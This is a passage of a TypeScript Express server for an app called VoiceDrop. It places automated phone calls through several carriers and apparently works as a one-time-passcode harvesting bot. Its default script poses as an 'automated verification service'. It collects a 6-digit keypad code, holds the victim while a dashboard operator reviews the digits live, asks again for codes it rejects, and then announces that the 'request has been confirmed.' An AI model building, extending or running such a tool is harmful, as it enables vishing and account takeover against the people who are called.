import 'dotenv/config';
import express, { Request, Response } from 'express';
import { createServer as createViteServer } from 'vite';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import twilio from 'twilio';
import { GoogleGenAI } from '@google/genai';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;
const isProd = process.env.NODE_ENV === 'production';

app.set('trust proxy', true);
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

function isLocalUrl(urlOrHost: string): boolean {
  const lower = urlOrHost.toLowerCase();
  return (
    lower.includes('localhost') ||
    lower.includes('127.0.0.1') ||
    lower.includes('0.0.0.0')
  );
}

function normalizeCallerId(raw?: string): string {
  if (!raw || !raw.trim()) return '';
  const digits = raw.replace(/\D/g, '');
  if (!digits) return '';
  if (digits.length === 10) return `+1${digits}`;
  if (digits.length === 11 && digits.startsWith('1')) return `+${digits}`;
  return `+${digits}`;
}

function isValidPublicHttpUrl(val?: string): boolean {
  if (!val || !val.trim() || val.trim() === 'MY_APP_URL') return false;
  try {
    const parsed = new URL(val.trim());
    if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') return false;
    return !isLocalUrl(parsed.host);
  } catch {
    return false;
  }
}

// Dynamic public base URL helper that auto-detects live production domains (reverse proxy headers, Origin/Referer, stored session base URL, or APP_URL)
export function getPublicBaseUrl(req?: Request, fallbackUrl?: string): string {
  if (req) {
    const rawProto = (req.headers['x-forwarded-proto'] as string) || req.protocol || 'https';
    const proto = rawProto.split(',')[0].trim() || 'https';
    const rawHost = (req.headers['x-forwarded-host'] as string) || req.headers.host || '';
    const host = rawHost.split(',')[0].trim();

    if (host && !isLocalUrl(host)) {
      return `${proto}://${host}`.replace(/\/$/, '');
    }

    const candidates = [
      req.body?.clientOrigin,
      req.headers.origin,
      req.headers.referer,
      fallbackUrl,
    ];

    for (const candidate of candidates) {
      if (isValidPublicHttpUrl(candidate)) {
        const parsed = new URL(candidate!.trim());
        return parsed.origin.replace(/\/$/, '');
      }
    }
  } else if (isValidPublicHttpUrl(fallbackUrl)) {
    return new URL(fallbackUrl!.trim()).origin.replace(/\/$/, '');
  }

  if (isValidPublicHttpUrl(process.env.APP_URL)) {
    return new URL(process.env.APP_URL!.trim()).origin.replace(/\/$/, '');
  }

  return `http://localhost:${PORT}`;
}

export interface CallSession {
  id: string;
  to: string;
  from: string;
  status: 'queued' | 'initiating' | 'ringing' | 'in-progress' | 'collecting-input' | 'awaiting-operator' | 'completed' | 'busy' | 'failed' | 'no-answer';
  introGreeting: string;
  script: string;
  verificationMode: 'manual' | 'auto';
  holdMessage: string;
  expectedCode?: string;
  invalidMessage?: string;
  successMessage?: string;
  maxAttempts?: number;
  attempts?: number;
  codeStatus?: 'pending' | 'awaiting_operator' | 'valid' | 'invalid' | 'max_exceeded';
  pendingDigits?: string;
  operatorDecision?: 'pending' | 'approved' | 'rejected';
  activeCue?: { text: string; timestamp: string };
  lastInvalidDigits?: string;
  voice: string;
  inputMode: 'dtmf' | 'speech' | 'dtmf speech';
  numDigits: number;
  keypadActions: Record<string, string>;
  capturedDigits?: string;
  capturedSpeech?: string;
  confidence?: number;
  duration?: number;
  isSimulated: boolean;
  carrier?: 'twilio' | 'plivo' | 'telnyx' | 'signalwire' | 'fonoster';
  providerCallSid?: string;
  publicBaseUrl?: string;
  waitPollCount?: number;
  createdAt: string;
  completedAt?: string;
  events: Array<{
    id: string;
    timestamp: string;
    type: 'system' | 'call-state' | 'playback' | 'gather' | 'dtmf' | 'speech' | 'error';
    title: string;
    description: string;
    data?: any;
  }>;
}

// In-memory sessions storage + /tmp file cache for resilience across restarts / worker processes
const SESSION_CACHE_FILE = '/tmp/voicedrop-sessions.json';
const sessions = new Map<string, CallSession>();
const providerSidToCallId = new Map<string, string>();

function persistSessionsToDisk() {
  try {
    const list = Array.from(sessions.values()).slice(-50);
    fs.writeFileSync(SESSION_CACHE_FILE, JSON.stringify(list), 'utf8');
  } catch {
    // Ignore disk cache errors in restricted environments
  }
}

function hydrateSessionsFromDisk() {
  try {
    if (!fs.existsSync(SESSION_CACHE_FILE)) return;
    const raw = fs.readFileSync(SESSION_CACHE_FILE, 'utf8');
    const list = JSON.parse(raw) as CallSession[];
    if (Array.isArray(list)) {
      for (const s of list) {
        if (s?.id && !sessions.has(s.id)) {
          sessions.set(s.id, s);
        }
        if (s?.id && s?.providerCallSid) {
          providerSidToCallId.set(s.providerCallSid, s.id);
        }
      }
    }
  } catch {
    // Ignore parse/read errors
  }
}

hydrateSessionsFromDisk();

function getSessionById(idOrSid?: string): CallSession | undefined {
  if (!idOrSid) return undefined;
  const key = idOrSid.trim();
  if (!key) return undefined;

  if (sessions.has(key)) return sessions.get(key);
  const mappedId = providerSidToCallId.get(key);
  if (mappedId && sessions.has(mappedId)) return sessions.get(mappedId);

  hydrateSessionsFromDisk();
  if (sessions.has(key)) return sessions.get(key);
  const mappedAfterHydrate = providerSidToCallId.get(key);
  if (mappedAfterHydrate && sessions.has(mappedAfterHydrate)) {
    return sessions.get(mappedAfterHydrate);
  }

  return Array.from(sessions.values()).find(
    (s) => s.id === key || s.providerCallSid === key
  );
}

// Active Server-Sent Event clients per callId
const sseClients = new Map<string, Set<Response>>();

function broadcastEvent(callId: string, eventName: string, data: any) {
  const clients = sseClients.get(callId);
  if (clients && clients.size > 0) {
    const payload = `event: ${eventName}\ndata: ${JSON.stringify(data)}\n\n`;
    for (const res of clients) {
      try {
        res.write(payload);
      } catch (err) {
        console.error('Error writing SSE to client:', err);
      }
    }
  }
}

function addSessionEvent(session: CallSession, event: Omit<CallSession['events'][0], 'id' | 'timestamp'>) {
  const fullEvent = {
    ...event,
    id: `evt-${Date.now()}-${Math.random().toString(36).substring(2, 7)}`,
    timestamp: new Date().toISOString(),
  };
  session.events.push(fullEvent);
  persistSessionsToDisk();
  broadcastEvent(session.id, 'call-event', fullEvent);
  broadcastEvent(session.id, 'session-update', session);
  return fullEvent;
}

// System configuration endpoint
app.get('/api/config', (req: Request, res: Response) => {
  const accountSid = process.env.TWILIO_ACCOUNT_SID || '';
  const authToken = process.env.TWILIO_AUTH_TOKEN || '';
  const phoneNumber = process.env.TWILIO_PHONE_NUMBER || '';
  const appUrl = getPublicBaseUrl(req);
  const rawGeminiKey = (process.env.GEMINI_API_KEY || '').trim();
  const hasGemini = Boolean(rawGeminiKey && rawGeminiKey !== 'MY_GEMINI_API_KEY');

  res.json({
    hasTwilioAccountSid: Boolean(accountSid.trim()),
    hasTwilioAuthToken: Boolean(authToken.trim()),
    hasTwilioPhoneNumber: Boolean(phoneNumber.trim()),
    isTwilioConfigured: Boolean(accountSid.trim() && authToken.trim() && phoneNumber.trim()),
    configuredPhoneNumber: phoneNumber ? `${phoneNumber.slice(0, 5)}...${phoneNumber.slice(-4)}` : null,
    appUrl,
    hasGemini,
  });
});

// Server-Sent Events stream for real-time call telemetry
app.get('/api/call/events/:callId', (req: Request, res: Response) => {
  const { callId } = req.params;

  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache, no-transform',
    Connection: 'keep-alive',
    'X-Accel-Buffering': 'no',
  });

  res.write(`data: ${JSON.stringify({ type: 'connected', callId })}\n\n`);

  if (!sseClients.has(callId)) {
    sseClients.set(callId, new Set());
  }
  sseClients.get(callId)!.add(res);

  // Send initial session data if already exists
  const session = getSessionById(callId);
  if (session) {
    res.write(`event: session-update\ndata: ${JSON.stringify(session)}\n\n`);
  }

  // Heartbeat ping every 15 seconds to keep connection alive
  const heartbeat = setInterval(() => {
    res.write(': heartbeat\n\n');
  }, 15000);

  req.on('close', () => {
    clearInterval(heartbeat);
    const clientSet = sseClients.get(callId);
    if (clientSet) {
      clientSet.delete(res);
      if (clientSet.size === 0) {
        sseClients.delete(callId);
      }
    }
  });
});

// Get session details
app.get('/api/calls/:callId', (req: Request, res: Response) => {
  const session = getSessionById(req.params.callId);
  if (!session) {
    return res.status(404).json({ error: 'Call session not found' });
  }
  res.json(session);
});

// List recent calls
app.get('/api/calls', (req: Request, res: Response) => {
  const list = Array.from(sessions.values()).sort(
    (a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime()
  );
  res.json(list.slice(0, 25));
});

// Initiate Call endpoint
app.post('/api/call/initiate', async (req: Request, res: Response) => {
  try {
    const {
      to,
      introGreeting = 'Hello, thank you for answering. This is an automated verification service.',
      message,
      verificationMode = 'manual',
      holdMessage = 'Kindly hold while your information is being processed.',
      expectedCode,
      invalidMessage = 'That code is incorrect. Please re-enter your code on your keypad now, followed by the pound sign.',
      successMessage = 'Thank you. Your code has been verified successfully. Your request has been confirmed. Goodbye.',
      maxAttempts = 3,
      voice = 'Polly.Joanna',
      inputMode = 'dtmf',
      numDigits = 6,
      keypadActions = {},
      mode = 'auto', // 'live' | 'simulator' | 'auto'
      customTwilio,
    } = req.body;

    if (!to || !message) {
      return res.status(400).json({ error: 'Target phone number and voice prompt are required.' });
    }

    // Clean & validate target phone number to E.164 (+1XXXXXXXXXX)
    const digitsOnly = to.replace(/\D/g, '');
    let formattedTo = to.trim();
    if (digitsOnly.length === 10) {
      formattedTo = `+1${digitsOnly}`;
    } else if (digitsOnly.length === 11 && digitsOnly.startsWith('1')) {
      formattedTo = `+${digitsOnly}`;
    }

    const e164Regex = /^\+1[2-9]\d{9}$/;
    if (!e164Regex.test(formattedTo)) {
      return res.status(400).json({
        error: `Invalid US phone number: "${to}". Must be a valid 10-digit US number (+1 [2-9]XX-XXX-XXXX).`,
      });
    }

    // Resolve Active Carrier and Credentials
    const carrier: 'twilio' | 'plivo' | 'telnyx' | 'signalwire' | 'fonoster' =
      req.body.carrier || req.body.carriersConfig?.activeCarrier || 'twilio';
    const carriersConfig = req.body.carriersConfig || {};

    let canUseLiveCarrier = false;
    let carrierPhone = '+18005550199';

    // Twilio
    const twilioAccountSid = carriersConfig.twilio?.accountSid || customTwilio?.accountSid || process.env.TWILIO_ACCOUNT_SID;
    const twilioAuthToken = carriersConfig.twilio?.authToken || customTwilio?.authToken || process.env.TWILIO_AUTH_TOKEN;
    const twilioPhone = normalizeCallerId(carriersConfig.twilio?.phoneNumber || customTwilio?.phoneNumber || process.env.TWILIO_PHONE_NUMBER);

    // Plivo
    const plivoAuthId = carriersConfig.plivo?.authId || process.env.PLIVO_AUTH_ID;
    const plivoAuthToken = carriersConfig.plivo?.authToken || process.env.PLIVO_AUTH_TOKEN;
    const plivoPhone = normalizeCallerId(carriersConfig.plivo?.phoneNumber || process.env.PLIVO_PHONE_NUMBER);

    // Telnyx
    const telnyxApiKey = carriersConfig.telnyx?.apiKey || process.env.TELNYX_API_KEY;
    const telnyxConnectionId = carriersConfig.telnyx?.connectionId || process.env.TELNYX_CONNECTION_ID;
    const telnyxPhone = normalizeCallerId(carriersConfig.telnyx?.phoneNumber || process.env.TELNYX_PHONE_NUMBER);

    // SignalWire
    const signalwireSpaceUrl = carriersConfig.signalwire?.spaceUrl || process.env.SIGNALWIRE_SPACE_URL;
    const signalwireProjectId = carriersConfig.signalwire?.projectId || process.env.SIGNALWIRE_PROJECT_ID;
    const signalwireApiToken = carriersConfig.signalwire?.apiToken || process.env.SIGNALWIRE_API_TOKEN;
    const signalwirePhone = normalizeCallerId(carriersConfig.signalwire?.phoneNumber || process.env.SIGNALWIRE_PHONE_NUMBER);

    // Fonoster
    const fonosterProjectId = carriersConfig.fonoster?.projectId || process.env.FONOSTER_PROJECT_ID;
    const fonosterAccessKeyId = carriersConfig.fonoster?.accessKeyId || process.env.FONOSTER_ACCESS_KEY_ID;
    const fonosterAccessKeySecret = carriersConfig.fonoster?.accessKeySecret || process.env.FONOSTER_ACCESS_KEY_SECRET;
    const fonosterPhone = normalizeCallerId(carriersConfig.fonoster?.phoneNumber || process.env.FONOSTER_PHONE_NUMBER);

    if (carrier === 'twilio') {
      canUseLiveCarrier = Boolean(twilioAccountSid && twilioAuthToken && twilioPhone);
      carrierPhone = twilioPhone || carrierPhone;
    } else if (carrier === 'plivo') {
      canUseLiveCarrier = Boolean(plivoAuthId && plivoAuthToken && plivoPhone);
      carrierPhone = plivoPhone || carrierPhone;
    } else if (carrier === 'telnyx') {
      canUseLiveCarrier = Boolean(telnyxApiKey && telnyxConnectionId && telnyxPhone);
      carrierPhone = telnyxPhone || carrierPhone;
    } else if (carrier === 'signalwire') {
      canUseLiveCarrier = Boolean(signalwireSpaceUrl && signalwireProjectId && signalwireApiToken && signalwirePhone);
      carrierPhone = signalwirePhone || carrierPhone;
    } else if (carrier === 'fonoster') {
      canUseLiveCarrier = Boolean(fonosterProjectId && fonosterAccessKeyId && fonosterAccessKeySecret && fonosterPhone);
      carrierPhone = fonosterPhone || carrierPhone;
    }

    const useSimulator = mode === 'simulator' || (mode === 'auto' && !canUseLiveCarrier);

    if (mode === 'live' && !canUseLiveCarrier) {
      return res.status(400).json({
        error: `${carrier.toUpperCase()} credentials not configured. Please supply required API keys in Carrier Settings, or select Simulator mode.`,
      });
    }

    const callId = `call_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`;
    const appBaseUrl = getPublicBaseUrl(req);

    const newSession: CallSession = {
      id: callId,
      to: formattedTo,
      from: carrierPhone,
      status: 'queued',
      introGreeting: introGreeting.trim(),
      script: message.trim(),
      verificationMode: verificationMode === 'auto' ? 'auto' : 'manual',
      holdMessage: holdMessage.trim(),
      expectedCode: expectedCode ? expectedCode.trim() : undefined,
      invalidMessage: invalidMessage.trim(),
      successMessage: successMessage.trim(),
      maxAttempts: Number(maxAttempts) || 3,
      attempts: 0,
      codeStatus: 'pending',
      voice,
      inputMode: 'dtmf',
      numDigits: Number(numDigits) || (expectedCode ? expectedCode.trim().length : 6),
      keypadActions: keypadActions || {},
      isSimulated: useSimulator,
      carrier,
      publicBaseUrl: appBaseUrl,
      createdAt: new Date().toISOString(),
      events: [],
    };

    sessions.set(callId, newSession);

    addSessionEvent(newSession, {
      type: 'system',
      title: 'Call Session Created',
      description: `Target: ${formattedTo}. Control: ${newSession.verificationMode === 'manual' ? 'Manual Operator Verification' : 'Automatic Match'}. Digits: ${newSession.numDigits}. Carrier: ${carrier.toUpperCase()} (${useSimulator ? 'Simulator' : 'Live PSTN'})`,
      data: { to: formattedTo, voice, numDigits: newSession.numDigits, verificationMode: newSession.verificationMode, carrier },
    });

    if (useSimulator) {
      setTimeout(() => {
        const s = sessions.get(callId);
        if (s && s.status === 'queued') {
          s.status = 'initiating';
          addSessionEvent(s, {
            type: 'call-state',
            title: 'Initiating Outbound Handshake',
            description: `Connecting route to local carrier switch for ${formattedTo}...`,
          });
        }
      }, 600);

      setTimeout(() => {
        const s = sessions.get(callId);
        if (s && s.status === 'initiating') {
          s.status = 'ringing';
          addSessionEvent(s, {
            type: 'call-state',
            title: 'Ringing Recipient Phone',
            description: 'Destination terminal is ringing. Waiting for recipient to answer...',
          });
        }
      }, 1800);

      return res.json({
        success: true,
        callId,
        session: newSession,
        mode: 'simulator',
        message: 'Simulator call initialized and ringing. Open the Interactive Phone Mockup to accept!',
      });
    }

    // LIVE PSTN CARRIER DISPATCH

    try {
      if (carrier === 'twilio') {
        const client = twilio(twilioAccountSid, twilioAuthToken);
        const outboundUrl = `${appBaseUrl}/api/twiml/outbound?callId=${encodeURIComponent(callId)}`;
        const statusCallbackUrl = `${appBaseUrl}/api/twiml/status?callId=${encodeURIComponent(callId)}`;

        addSessionEvent(newSession, {
          type: 'system',
          title: 'Dispatching Twilio API Request',
          description: `Calling Twilio Programmable Voice endpoint with webhook: ${outboundUrl}`,
        });

        const call = await client.calls.create({
          to: formattedTo,
          from: twilioPhone,
          url: outboundUrl,
          statusCallback: statusCallbackUrl,
          statusCallbackEvent: ['initiated', 'ringing', 'answered', 'completed'],
          statusCallbackMethod: 'POST',
        });

        newSession.providerCallSid = call.sid;
        providerSidToCallId.set(call.sid, callId);
        persistSessionsToDisk();

        addSessionEvent(newSession, {
          type: 'call-state',
          title: 'Twilio Call Dispatched',
          description: `Twilio Call SID: ${call.sid}. Carrier status: ${call.status}.`,
          data: { callSid: call.sid, status: call.status },
        });

        return res.json({
          success: true,
          callId,
          providerCallSid: call.sid,
          session: newSession,
          mode: 'live',
          carrier: 'twilio',
          message: `Live Twilio call placed to ${formattedTo}!`,
        });
      } else if (carrier === 'plivo') {
        const answerUrl = `${appBaseUrl}/api/plivo/outbound?callId=${encodeURIComponent(callId)}`;
        const statusUrl = `${appBaseUrl}/api/plivo/status?callId=${encodeURIComponent(callId)}`;

        addSessionEvent(newSession, {
          type: 'system',
          title: 'Dispatching Plivo Voice API Request',
          description: `Calling Plivo endpoint with Answer URL: ${answerUrl}`,
        });

        const plivoRes = await fetch(`https://api.plivo.com/v1/Account/${plivoAuthId}/Call/`, {
          method: 'POST',
          headers: {
            Authorization: `Basic ${Buffer.from(`${plivoAuthId}:${plivoAuthToken}`).toString('base64')}`,
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            from: plivoPhone,
            to: formattedTo,
            answer_url: answerUrl,
            answer_method: 'POST',
            hangup_url: statusUrl,
            hangup_method: 'POST',
          }),
        });

        const plivoData: any = await plivoRes.json();
        if (!plivoRes.ok) {
          throw new Error(plivoData.message || plivoData.error || 'Plivo API call failed');
        }

        const callSid = plivoData.request_uuid || plivoData.call_uuid || callId;
        newSession.providerCallSid = callSid;
        providerSidToCallId.set(callSid, callId);
        persistSessionsToDisk();

        addSessionEvent(newSession, {
          type: 'call-state',
          title: 'Plivo Call Dispatched',
          description: `Plivo Request UUID: ${callSid}. Call queued on Plivo carrier network.`,
          data: { callSid },
        });

        return res.json({
          success: true,
          callId,
          providerCallSid: callSid,
          session: newSession,
          mode: 'live',
          carrier: 'plivo',
          message: `Live Plivo call placed to ${formattedTo}!`,
        });
      } else if (carrier === 'telnyx') {
        const texmlUrl = `${appBaseUrl}/api/telnyx/texml?callId=${encodeURIComponent(callId)}`;
        const statusUrl = `${appBaseUrl}/api/telnyx/status?callId=${encodeURIComponent(callId)}`;

        addSessionEvent(newSession, {
          type: 'system',
          title: 'Dispatching Telnyx TeXML Call',
          description: `Calling Telnyx TeXML endpoint with webhook: ${texmlUrl}`,
        });

        const telnyxRes = await fetch('https://api.telnyx.com/v2/texml/calls', {
          method: 'POST',
          headers: {
            Authorization: `Bearer ${telnyxApiKey}`,
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            to: formattedTo,
            from: telnyxPhone,
            url: texmlUrl,
            status_callback: statusUrl,
            connection_id: telnyxConnectionId,
          }),
        });

        const telnyxData: any = await telnyxRes.json();
        if (!telnyxRes.ok) {
          throw new Error(telnyxData.errors?.[0]?.detail || telnyxData.message || 'Telnyx call failed');
        }

        const callSid = telnyxData.data?.call_control_id || telnyxData.data?.call_leg_id || callId;
        newSession.providerCallSid = callSid;
        providerSidToCallId.set(callSid, callId);
        persistSessionsToDisk();

        addSessionEvent(newSession, {
          type: 'call-state',
          title: 'Telnyx Call Dispatched',
          description: `Telnyx Call Control ID: ${callSid}.`,
          data: { callSid },
        });

        return res.json({
          success: true,
          callId,
          providerCallSid: callSid,
          session: newSession,
          mode: 'live',
          carrier: 'telnyx',
          message: `Live Telnyx call placed to ${formattedTo}!`,
        });
      } else if (carrier === 'signalwire') {
        const cleanSpace = (signalwireSpaceUrl || '').replace(/^https?:\/\//, '').replace(/\/$/, '');
        const lamlUrl = `${appBaseUrl}/api/signalwire/laml?callId=${encodeURIComponent(callId)}`;
        const statusUrl = `${appBaseUrl}/api/signalwire/status?callId=${encodeURIComponent(callId)}`;

        addSessionEvent(newSession, {
          type: 'system',
          title: 'Dispatching SignalWire Compatibility Call',
          description: `Calling SignalWire Space [${cleanSpace}] with LAML webhook: ${lamlUrl}`,
        });

        const swUrl = `https://${cleanSpace}/api/laml/2010-04-01/Accounts/${signalwireProjectId}/Calls.json`;
        const swRes = await fetch(swUrl, {
          method: 'POST',
          headers: {
            Authorization: `Basic ${Buffer.from(`${signalwireProjectId}:${signalwireApiToken}`).toString('base64')}`,
            'Content-Type': 'application/x-www-form-urlencoded',
          },
          body: new URLSearchParams({
            To: formattedTo,
            From: signalwirePhone || '',
            Url: lamlUrl,
            StatusCallback: statusUrl,
          }).toString(),
        });

        const swData: any = await swRes.json();
        if (!swRes.ok) {
          throw new Error(swData.message || swData.error_message || 'SignalWire API call failed');
        }

        const callSid = swData.sid || callId;
        newSession.providerCallSid = callSid;
        providerSidToCallId.set(callSid, callId);
        persistSessionsToDisk();

        addSessionEvent(newSession, {
          type: 'call-state',
          title: 'SignalWire Call Dispatched',
          description: `SignalWire Call SID: ${callSid}. Status: ${swData.status || 'queued'}.`,
          data: { callSid },
        });

        return res.json({
          success: true,
          callId,
          providerCallSid: callSid,
          session: newSession,
          mode: 'live',
          carrier: 'signalwire',
          message: `Live SignalWire call placed to ${formattedTo}!`,
        });
      } else if (carrier === 'fonoster') {
        const webhookUrl = `${appBaseUrl}/api/fonoster/webhook?callId=${encodeURIComponent(callId)}`;
        addSessionEvent(newSession, {
          type: 'system',
          title: 'Dispatching Fonoster Voice Application',
          description: `Fonoster Voice webhook active: ${webhookUrl}`,
        });

        return res.json({
          success: true,
          callId,
          session: newSession,
          mode: 'live',
          carrier: 'fonoster',
          message: `Fonoster call routing configured. Listening for webhook events!`,
        });
      }
    } catch (carrierErr: any) {
      console.error(`${carrier.toUpperCase()} Call Error:`, carrierErr);
      newSession.status = 'failed';
      addSessionEvent(newSession, {
        type: 'error',
        title: `${carrier.toUpperCase()} Carrier Dispatch Error`,
        description: carrierErr.message || `Failed to initiate ${carrier} voice call.`,
        data: carrierErr,
      });

      return res.status(500).json({
        error: `${carrier.toUpperCase()} call failed: ${carrierErr.message || 'Unknown carrier error'}`,
        callId,
        session: newSession,
      });
    }
  } catch (error: any) {
    console.error('Call initiation error:', error);
    res.status(500).json({ error: error.message || 'Internal server error' });
  }
});

// Helper to escape XML characters
function escapeXml(unsafe: string): string {
  if (!unsafe) return '';
  return String(unsafe).replace(/[<>&'"]/g, (c) => {
    switch (c) {
      case '<': return '&lt;';
      case '>': return '&gt;';
      case '&': return '&amp;';
      case '\'': return '&apos;';
      case '"': return '&quot;';
      default: return c;
    }
  });
}

// Helper to find session by checking ALL candidate identifier keys across carriers + active phone fallback
function findSession(req: Request): CallSession | undefined {
  const candidates = [
    req.query?.callId,
    req.body?.CallSid,
    req.body?.ParentCallSid,
    req.body?.CallUUID,
    req.body?.RequestUUID,
    req.body?.call_control_id,
    req.body?.call_leg_id,
    req.body?.callId,
    req.body?.id,
  ]
    .map((v) => (typeof v === 'string' ? v.trim() : ''))
    .filter(Boolean);

  for (const key of candidates) {
    const found = getSessionById(key);
    if (found) return found;
  }

  // Fallback: if carrier webhook omitted query params, match most recent active session for recipient phone
  const rawTo = req.body?.To || req.body?.Called || req.query?.To;
  if (typeof rawTo === 'string' && rawTo.trim()) {
    const normTo = normalizeCallerId(rawTo);
    const activeByPhone = Array.from(sessions.values())
      .filter(
        (s) =>
          s.to === normTo &&
          ['queued', 'initiating', 'ringing', 'in-progress', 'collecting-input', 'awaiting-operator'].includes(
            s.status
          )
      )
      .sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime())[0];
    if (activeByPhone) return activeByPhone;
  }

  return undefined;
}

// -------------------------------------------------------------
// UNIFIED VOICE XML WEBHOOKS (Twilio TwiML, Telnyx TeXML, SignalWire LAML, Fonoster)
// -------------------------------------------------------------
const XML_OUTBOUND_ROUTES = [
  '/api/twiml/outbound',
  '/api/telnyx/texml',
  '/api/telnyx/outbound',
  '/api/signalwire/laml',
  '/api/signalwire/outbound',
  '/api/fonoster/webhook',
  '/api/fonoster/outbound',
];

const XML_GATHER_ROUTES = [
  '/api/twiml/gather',
  '/api/telnyx/gather',
  '/api/signalwire/gather',
  '/api/fonoster/gather',
];

const XML_WAIT_ROUTES = [
  '/api/twiml/wait-operator',
  '/api/telnyx/wait-operator',
  '/api/signalwire/wait-operator',
  '/api/fonoster/wait-operator',
];

const XML_CUE_GATHER_ROUTES = [
  '/api/twiml/cue-gather',
  '/api/telnyx/cue-gather',
  '/api/signalwire/cue-gather',
  '/api/fonoster/cue-gather',
];

const XML_STATUS_ROUTES = [
  '/api/twiml/status',
  '/api/telnyx/status',
  '/api/signalwire/status',
  '/api/fonoster/status',
];

// 1. XML Outbound Webhook - Recipient Answered
app.all(XML_OUTBOUND_ROUTES, (req: Request, res: Response) => {
  const session = findSession(req);
  const twiml = new twilio.twiml.VoiceResponse();

  if (!session) {
    twiml.say({ voice: 'Polly.Joanna' }, 'Welcome to VoiceDrop Interactive. Session could not be found.');
    twiml.hangup();
    res.type('text/xml');
    return res.send(twiml.toString());
  }

  // Record provider CallSid if not already stored
  const incomingSid = req.body?.CallSid || req.body?.call_control_id;
  if (typeof incomingSid === 'string' && incomingSid.trim() && !session.providerCallSid) {
    session.providerCallSid = incomingSid.trim();
    providerSidToCallId.set(incomingSid.trim(), session.id);
  }

  session.status = 'in-progress';
  addSessionEvent(session, {
    type: 'call-state',
    title: 'Recipient Answered Call',
    description: `Call connected with ${session.to}. Playing immediate pickup greeting.`,
  });

  addSessionEvent(session, {
    type: 'playback',
    title: 'Immediate Pickup Greeting Played',
    description: `Playing synthetic voice (${session.voice}): "${session.introGreeting}"`,
    data: { greeting: session.introGreeting, voice: session.voice },
  });
  twiml.say({ voice: session.voice as any }, session.introGreeting);

  const appBaseUrl = getPublicBaseUrl(req, session.publicBaseUrl);
  const matchedBase = XML_GATHER_ROUTES.find((r) => req.path.includes(r.split('/')[2])) || '/api/twiml/gather';
  const gatherActionUrl = `${appBaseUrl}${matchedBase}?callId=${encodeURIComponent(session.id)}`;

  const gather = twiml.gather({
    action: gatherActionUrl,
    method: 'POST',
    input: ['dtmf'],
    numDigits: session.numDigits || 6,
    finishOnKey: '#',
    timeout: 25,
  });
  gather.say({ voice: session.voice as any }, session.script);

  // Give caller one extra chance if first Gather timed out before hanging up
  const gatherSecondChance = twiml.gather({
    action: gatherActionUrl,
    method: 'POST',
    input: ['dtmf'],
    numDigits: session.numDigits || 6,
    finishOnKey: '#',
    timeout: 20,
  });
  gatherSecondChance.say(
    { voice: session.voice as any },
    `We have not received your entry yet. ${session.script}`
  );

  twiml.say({ voice: session.voice as any }, 'We did not receive your code. Thank you for your time. Goodbye.');
  twiml.hangup();

  session.status = 'collecting-input';
  addSessionEvent(session, {
    type: 'gather',
    title: `Listening for ${session.numDigits}-Digit Code`,
    description: `Gather verb active. Expecting ${session.numDigits} digits.`,
  });

  res.type('text/xml');
  res.send(twiml.toString());
});

// 1b. Live Operator Cue during Gather - Speaks operator cue and resumes listening for DTMF
app.all(XML_CUE_GATHER_ROUTES, (req: Request, res: Response) => {
  const session = findSession(req);
  const twiml = new twilio.twiml.VoiceResponse();

  if (!session) {
    twiml.hangup();
    res.type('text/xml');
    return res.send(twiml.toString());
  }

  const appBaseUrl = getPublicBaseUrl(req, session.publicBaseUrl);
  const matchedBase = XML_GATHER_ROUTES.find((r) => req.path.includes(r.split('/')[2])) || '/api/twiml/gather';
  const gatherActionUrl = `${appBaseUrl}${matchedBase}?callId=${encodeURIComponent(session.id)}`;

  if (session.activeCue?.text) {
    const cueMsg = session.activeCue.text;
    session.activeCue = undefined;
    persistSessionsToDisk();
    twiml.say({ voice: session.voice as any }, cueMsg);
  }

  const gather = twiml.gather({
    action: gatherActionUrl,
    method: 'POST',
    input: ['dtmf'],
    numDigits: session.numDigits || 6,
    finishOnKey: '#',
    timeout: 25,
  });
  gather.pause({ length: 1 });

  twiml.say({ voice: session.voice as any }, 'We did not receive your code. Goodbye.');
  twiml.hangup();

  session.status = 'collecting-input';
  persistSessionsToDisk();
  res.type('text/xml');
  res.send(twiml.toString());
});

// 2. XML Gather Callback - DTMF Code Entered
app.all(XML_GATHER_ROUTES, (req: Request, res: Response) => {
  const session = findSession(req);
  const digits = req.body.Digits || req.query.Digits;
  const twiml = new twilio.twiml.VoiceResponse();
  const appBaseUrl = getPublicBaseUrl(req, session?.publicBaseUrl);

  const matchedWaitBase = XML_WAIT_ROUTES.find((r) => req.path.includes(r.split('/')[2])) || '/api/twiml/wait-operator';
  const matchedGatherBase = XML_GATHER_ROUTES.find((r) => req.path.includes(r.split('/')[2])) || '/api/twiml/gather';

  if (session && digits) {
    const rawDigits = String(digits).trim();

    // 1. MANUAL OPERATOR REVIEW MODE (Default)
    if (session.verificationMode === 'manual') {
      session.pendingDigits = rawDigits;
      session.codeStatus = 'awaiting_operator';
      session.status = 'awaiting-operator';
      session.operatorDecision = 'pending';

      addSessionEvent(session, {
        type: 'dtmf',
        title: `Code Received: [${rawDigits}] — Awaiting Operator Decision`,
        description: `Recipient entered ${rawDigits.length}-digit code. Playing hold message while dashboard operator reviews.`,
        data: { digits: rawDigits, verificationMode: 'manual' },
      });

      const holdPrompt = session.holdMessage || 'Kindly hold while your information is being processed.';
      session.waitPollCount = 0;
      persistSessionsToDisk();
      twiml.say({ voice: session.voice as any }, holdPrompt);
      twiml.pause({ length: 2 });
      twiml.redirect({ method: 'POST' }, `${appBaseUrl}${matchedWaitBase}?callId=${encodeURIComponent(session.id)}`);

      res.type('text/xml');
      return res.send(twiml.toString());
    }

    // 2. AUTOMATIC CODE MATCH MODE
    const gatherActionUrl = `${appBaseUrl}${matchedGatherBase}?callId=${encodeURIComponent(session.id)}`;
    const isValid = !session.expectedCode || rawDigits === session.expectedCode.trim();

    if (!isValid) {
      session.attempts = (session.attempts || 0) + 1;
      session.lastInvalidDigits = rawDigits;
      session.codeStatus = 'invalid';

      const maxAttempts = session.maxAttempts || 3;

      if (session.attempts < maxAttempts) {
        addSessionEvent(session, {
          type: 'error',
